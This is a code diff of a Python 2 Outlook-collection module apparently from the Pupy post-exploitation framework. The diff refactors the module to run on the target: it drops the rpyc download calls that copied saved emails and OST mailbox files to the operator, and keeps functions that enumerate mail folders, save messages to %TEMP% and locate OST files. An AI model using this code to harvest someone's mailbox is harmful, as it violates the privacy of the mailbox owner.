@@ -3,9 +3,10 @@
 #Contributor(s):
 
 import os, logging, sys, time
-from rpyc.utils.classic import download
-from pupylib.utils.term import colorize
 from collections import OrderedDict
+import win32com
+import win32com.client
+import glob
 
 class outlook():
 	'''
@@ -16,13 +17,11 @@ class outlook():
 	OL_ACCOUNT_TYPES = {4:'olEas',0:'olExchange',3:'olHttp',1:'olImap',5:'olOtherAccount',2:'olPop3'}
 	OL_EXCHANGE_CONNECTION_MODE = {100:'olOffline',500:'olOnline',200:'olDisconnected',300:'olConnectedHeaders',400:'olConnected',0:'olNoExchange'}
 	
-	def __init__(self, module, rootPupyPath, localFolder="output/", folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG', autoConnectToMAPI=True):
+	def __init__(self, folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG'):
 		'''
 		'''
-		self.module = module
 		self.outlook = None
 		self.mapi = None
-		self.localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.module.client.desc['hostname'].encode('utf-8'), self.module.client.desc['user'].encode('utf-8'), self.module.client.desc['macaddr'].encode('utf-8').replace(':','')))
 		self.foldersAndSubFolders = None
 		self.folderId = folderId
 		self.folderIndex = folderIndex
@@ -30,24 +29,34 @@ class outlook():
 		self.inbox = None
 		self.constants = None
 		self.sleepTime = sleepTime
-		self.remoteTempFolder = self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
-		if autoConnectToMAPI == True : self.__connect__()
-		if not os.path.exists(self.localFolder):
-			logging.debug("Creating the {0} folder locally".format(self.localFolder))
-			os.makedirs(self.localFolder)
+		self.remoteTempFolder = os.path.expandvars("%TEMP%")
 				
-	def __connect__(self):
+	def outlookIsInstalled(self):
+		'''
+		returns True if Outlook is installed
+		otherwise returns False
+		'''
+		try:
+			win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
+			return True
+		except Exception,e:
+			return False
+		
+				
+	def connect(self):
 		'''
 		Returns True if no error
 		Otherise returns False
 		'''
-		
-		self.outlook = self.module.client.conn.modules['win32com.client'].Dispatch("Outlook.Application")
-		#self.outlook = self.module.client.conn.modules['win32com.client.gencache'].EnsureDispatch("Outlook.Application")
-		self.mapi = self.outlook.GetNamespace("MAPI")
-		if self.folderId == None : self.setDefaultFolder(folderIndex=self.folderIndex)
-		else : self.setFolderFromId(folderId=self.folderId)
-		return True
+		try:
+			self.outlook = win32com.client.Dispatch("Outlook.Application")
+			#self.outlook = win32com.client.gencache.EnsureDispatch("Outlook.Application")
+			self.mapi = self.outlook.GetNamespace("MAPI")
+			if self.folderId == None : self.setDefaultFolder(folderIndex=self.folderIndex)
+			else : self.setFolderFromId(folderId=self.folderId)
+			return True
+		except Exception,e:
+			return False
 	
 	def close(self):
 		'''
@@ -119,27 +128,6 @@ class outlook():
 			logging.debug("Moving outlook default folder to {0}".format(folderId))
 			self.inbox = self.mapi.GetFolderFromID(folderId)
 			return True
-	
-	"""
-	def getAnEmail(self, nb):
-		'''
-		nb: number of the email
-		nb>=1
-		'''
-		return self.inbox.Items[nb]
-	"""
-	
-	"""
-	def getEmailsWithSubject(self, subject):
-		'''
-		Returns a list which contains all emails (mailItem objects) when subject is in the email subject
-		'''
-		emails = []
-		for anEmail in self.inbox.Items:
-			if subject in anEmail.Subject:
-				emails.append(anEmail)
-		return emails
-	"""
 		
 	def getEmails(self):
 		'''
@@ -151,8 +139,9 @@ class outlook():
 			emails.append(anEmail)
 		return emails
 		
-	def downloadAnEmail(self, mailItem):
+	def getAMailFile(self, mailItem):
 		'''
+		return pathToAMailFileOnTarget, nameOftheMailFile
 		'''
 		ctime, subjectCleaned, receivedTime, path, filename = str(time.time()).replace('.',''), "Unknown", "Unknown", "", ""
 		try:
@@ -161,28 +150,21 @@ class outlook():
 		except Exception,e:
 			logging.warning("Impossible to encode email subject or receivedTime:{0}".format(repr(e)))
 		filename = "{0}_{1}_{2}.{3}".format(receivedTime, ctime, subjectCleaned[:100], 'msg')
-		path = self.module.client.conn.modules['os.path'].join(self.remoteTempFolder,filename)
+		path = os.path.join(self.remoteTempFolder,filename)
 		logging.debug('Saving temporarily the email on the remote path {0}'.format(path))
 		#mailItem.SaveAs(path, self.OL_SAVE_AS_TYPE['olMSG'])
 		mailItem.SaveAs(path, outlook.OL_SAVE_AS_TYPE[self.msgSaveType])
 		try:
-			self.module.client.conn.modules['os'].rename(path, path) #test if the file is not opened by another process
+			os.rename(path, path) #test if the file is not opened by another process
 		except OSError as e:
 			time.sleep(self.sleepTime)
-		logging.debug("Downloading the file {0} to {1}".format(path, self.localFolder))
-		download(self.module.client.conn, path, os.path.join(self.localFolder, filename))
-		logging.debug("Deleting {0}".format(path))
-		self.module.client.conn.modules.os.remove(path)
-	
-	def downloadAllEmails(self):
+		return path, filename
+		
+		
+	def deleteTempMailFile(self,path):
 		'''
 		'''
-		logging.debug("Downloading all emails")
-		for i, anEmail in enumerate(self.getEmails()):
-			self.downloadAnEmail(anEmail)
-			sys.stdout.write('\r{2}Downloading email {0}/{1}...'.format(i+1 ,self.getNbOfEmails(), colorize("[+] ","green")))
-			sys.stdout.flush()
-		print "\n"
+		os.remove(path)
 	
 	"""
 	def getAllSubjects(self):
@@ -203,7 +185,7 @@ class outlook():
 		logging.debug("Getting number of emails... {0} emails".format(nb))
 		return nb
 		
-	def __getAllFolders__(self):
+	def getAllFolders(self):
 		'''
 		'''
 		folders = {}
@@ -216,15 +198,6 @@ class outlook():
 					folders[folder.Name][subfolder.Name]=subfolder.EntryID
 		return folders
 	
-	def printFoldersAndSubFolders(self):
-		'''
-		'''
-		foldersAndSubFolders = self.__getAllFolders__()
-		for i,folder in enumerate(foldersAndSubFolders):
-			print "{0}: {1}".format(i, folder.encode('utf-8'))
-			for j,subFolder in enumerate(foldersAndSubFolders[folder]):
-				print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
-	
 	
 	def getPathToOSTFiles(self):
 		'''
@@ -234,58 +207,15 @@ class outlook():
 		DEFAULT_LOCATIONS_OST = ["<drive>:\Users\<username>\AppData\Local\Microsoft\Outlook",
 		"<drive>:\Documents and Settings\<username>\Local Settings\Application Data\Microsoft\Outlook"
 		]
-		systemDrive = self.module.client.conn.modules['os'].getenv("SystemDrive")
-		login = self.module.client.conn.modules['os'].getenv("username")
+		systemDrive = os.getenv("SystemDrive")
+		login = os.getenv("username")
 		for aLocationOST in DEFAULT_LOCATIONS_OST :
 			completeLocationOST = aLocationOST.replace("<drive>",systemDrive[:-1]).replace("<username>",login)
-			regex = self.module.client.conn.modules['os.path'].join(completeLocationOST,"*.ost")
+			regex = os.path.join(completeLocationOST,"*.ost")
 			logging.debug('Searching OST file in {0}'.format(regex))
-			files = self.module.client.conn.modules['glob'].glob(regex)
+			files = glob.glob(regex)
 			for aFile in files:
-				ostFileFound = self.module.client.conn.modules['os.path'].join(completeLocationOST,aFile)
+				ostFileFound = os.path.join(completeLocationOST,aFile)
 				logging.info('OST file found in {0}'.format(ostFileFound))
-				paths.append(ostFileFound)
+				paths.append([os.path.basename(aFile), ostFileFound])
 		return paths
-		
-	def downloadOSTFile(self):
-		'''
-		Return file downloaded or None
-		'''
-		paths = self.getPathToOSTFiles()
-		if len(paths)>0:
-			filename = self.module.client.conn.modules['os.path'].basename(paths[0])
-			logging.debug("Downloading the file {0} to {1}".format(paths[0], self.localFolder))
-			download(self.module.client.conn, paths[0], os.path.join(self.localFolder, filename))
-			return paths[0]
-		else:
-			return None
-		
-	
-	"""
-	def __getRecipientsAddresses__(self, RecipientsObject):
-		'''
-		'''
-		recipients = []
-		for aRecipient in RecipientsObject:
-			recipients.append(aRecipient.Address)
-		return recipients
-		
-	def __getSenderAddress__(self, mailItem):
-		'''
-		'''
-		if mailItem.SenderEmailType=='EX':
-			try:
-				return mailItem.Sender.GetExchangeUser().PrimarySmtpAddress
-			except Exception,e:
-				logging.warning("Impossible to get sender email address: {0}".format(e))
-		return mailItem.SenderEmailAddress
-		
-	def printMailItem(self, mailItem):
-		'''
-		'''
-		print "ReceivedTime: {0}".format(mailItem.ReceivedTime)
-		#print "Sender: {0}".format(self.__getSenderAddress__(mailItem))
-		#print "Recipients: {0}".format(self.__getRecipientsAddresses__(mailItem.Recipients))
-		print "Subject: {0}".format(repr(mailItem.Subject))
-		print "Body: {0}".format(repr(mailItem.Body))
-	"""
